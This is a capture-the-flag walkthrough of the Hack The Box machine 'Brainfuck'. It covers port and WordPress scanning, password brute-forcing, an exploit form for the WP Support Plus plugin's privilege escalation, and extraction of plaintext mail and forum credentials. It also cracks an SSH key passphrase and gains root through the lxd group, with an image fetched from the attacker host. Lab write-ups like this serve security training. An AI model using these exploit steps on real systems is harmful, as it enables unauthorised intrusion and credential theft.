# IP Address: 10.10.10.17

# Enumeration.1
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.17 -t all

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)                                                       
|_http-title: Welcome to nginx!                                                       
| tls-nextprotoneg:                                                                   
|_  http/1.1                                                                           
|_ssl-date: TLS randomness does not represent time                                     
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    3072

Subject:  brainfuck.htb
Altnames: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
Issuer:   brainfuck.htb

Not valid before: Apr 13 11:19:29 2017 GMT
Not valid after:  Apr 11 11:19:29 2027 GMT

```

Since there are multiple hostnames on the certificate, add entries in local /etc/hosts for each name. We may be taken to different sites depending on the hostname queried. 

```
┌──(code㉿kali)-[~]
└─$ grep brain /etc/hosts
10.10.10.17     brainfuck.htb
10.10.10.17     sup3rs3cr3t.brainfuck.htb
10.10.10.17     www.brainfuck.htb
```

Browse to each hostname.

### HTTPS Enumeration
At brainfuck.htb and www.brainfuck.htb we see a Wordpress site and get an email address, orestis@brainfuck.htb

![site1](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111171230.png)

At sup3rs3cr3t.brainfuck.htb we see a forum. 

![site2](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111171735.png)

Enumerate the Wordpress site with wpscan. 

```
┌──(code㉿kali)-[~]
└─$ wpscan --api-token=$token --url=https://brainfuck.htb -e vp,u --plugins-detection aggressive --disable-tls-checks

 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.7.6
 | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
 |     Fixed in: 4.7.5
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.7.17

[i] Plugin(s) Identified:

[+] easy-wp-smtp
 | Location: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/
 | [!] The version is out of date, the latest version is 1.4.7
 | [!] Directory listing is enabled
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Easy WP SMTP <= 1.3.9 - Unauthenticated Arbitrary wp_options Import
 |     Fixed in: 1.3.9.1

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | [!] The version is out of date, the latest version is 9.1.2
 | [!] Directory listing is enabled

[!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 |     Fixed in: 8.0.0
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 |     Fixed in: 9.0.3
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 |     Fixed in: 8.0.8

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


```

Wpscan gave us a ton of information. While performing the following, bruteforce the admin login with hydra. 
```
┌──(code㉿kali)-[~]
└─$ wpscan --url https://brainfuck.htb/ -U admin -P /usr/share/wordlists/rockyou.txt --disable-tls-checks
```

Search for 'WP Support Plus Responsive Ticket System' exploits. Find SQL injection and Privilege Escalation exploits. First, try Privilege Escalation since we have a valid username.

# Exploitation.1

Create test.html web page, editing the exploit with relevent target data, and host it locally on Apache web server. 

Original code:
```
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```
Edited code:
```
<form method ="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">     # EDIT
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Browse to http://127.0.0.1/test.html and click "Login."
Then browse to https://brainfuck.htb/wp-admin and find the admin dashboard.

![dashboard](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111180553.png)

I tried replacing theme page code and uploading a new plugin with reverse shell code written in PHP, however, the server does not appear to have write access to the filesystem. 

In the Easy WP SMTP plugin, we find credentials for orestis. The password field is masked, but we can see the plaintext password using Inspect Element.

![password](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111193417.png)

orestis:kHGuERB29DNiNE

# Enumeration.2
Login as orestis to the POP3 server and check for email. The first email is the Wordpress welcome email. The second has plaintext credentials for sup3rs3cr3t.brainfuck.htb
```
┌──(code㉿kali)-[~]
└─$ telnet 10.10.10.17 110
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 2 messages:
1 977
2 514
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.

```

Login to the forum as orestis. 

![forum](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111193930.png)

There is a conversation between orestis and the site admin regarding server SSH access. The discussion is moved to an encrypted thread which uses Vigenere cipher with key 'fuckmybrain' (borrowed from a write-up since cryptography is hard). In the thread, the admin provides a link to orestis SSH private key. Here's the decrypted link.
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

![cipher](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111195735.png)

Browse to the link and download the key. It is password protected. 
```
┌──(code㉿kali)-[~]
└─$ ssh orestis@10.10.10.17 -i orestis 
The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established.
ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.17' (ED25519) to the list of known hosts.
Enter passphrase for key 'orestis': 
orestis@10.10.10.17: Permission denied (publickey).

```

It can be unlocked with John the Ripper as follows.
```
┌──(code㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py

Saving to: ‘ssh2john.py’

ssh2john.py                         100%[================================================================>]   8.34K  --.-KB/s    in 0.004s  

2021-11-11 22:19:02 (2.28 MB/s) - ‘ssh2john.py’ saved [8537/8537]

┌──(code㉿kali)-[~]
└─$ python ssh2john.py orestis > orestis.hash

┌──(code㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt orestis.hash 

3poulakia!       (orestis)

```

SSH into server as orestis

user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211111222306.png)

# Privilege Escalation

Find encrypt.sage in /home/orestis; looks like a script to encrypt the root.txt file, but wouldn't escalate our privileges. Skip for now. 

Orestis is a member of the lxd group.
```
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)

```

Download alpine builder and run the build-alpine script as root.
```
┌──(code㉿kali)-[~]
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 42, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 42 (delta 5), reused 4 (delta 1), pack-reused 27
Receiving objects: 100% (42/42), 3.11 MiB | 2.93 MiB/s, done.
Resolving deltas: 100% (11/11), done.

┌──(code㉿kali)-[~]
└─$ cd lxd-alpine-builder/

┌──(code㉿kali)-[~/lxd-alpine-builder]
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md

┌──(code㉿kali)-[~/lxd-alpine-builder]
└─$ sudo ./build-alpine 
[sudo] password for code: 
Determining the latest release... v3.14
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.14/main/x86_64
Downloading apk-tools-static-2.12.7-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.4-r0.apk

```

Copy the build to the local web server and use wget on the target to pull it down. Import the image.
```
orestis@brainfuck:~$ wget http://10.10.14.7/alpine.tar.gz
--2021-11-13 01:58:09--  http://10.10.14.7/alpine.tar.gz
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3232346 (3.1M) [application/x-gzip]
Saving to: ‘alpine.tar.gz’

alpine.tar.gz            100%[==================================>]   3.08M  1.59MB/s    in 1.9s    

2021-11-13 01:58:11 (1.59 MB/s) - ‘alpine.tar.gz’ saved [3232346/3232346]

orestis@brainfuck:~$ lxc image import ./alpine.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: 65923e2b761466df6755c8e73c180d623af00c2952d6ba633861021315fb4a7a

orestis@brainfuck:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | 65923e2b7614 | no     | alpine v3.14 (20211112_18:49) | x86_64 | 3.08MB | Nov 12, 2021 at 11:58pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+

```

The following commands get us to root permissions on the alpine container, from which we can cd to /root on the target since we mounted it. 
```
orestis@brainfuck:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
orestis@brainfuck:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
orestis@brainfuck:~$ lxc start ignite
orestis@brainfuck:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
```

# Proof

root.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Brainfuck/images/Pasted%20image%2020211112190033.png)
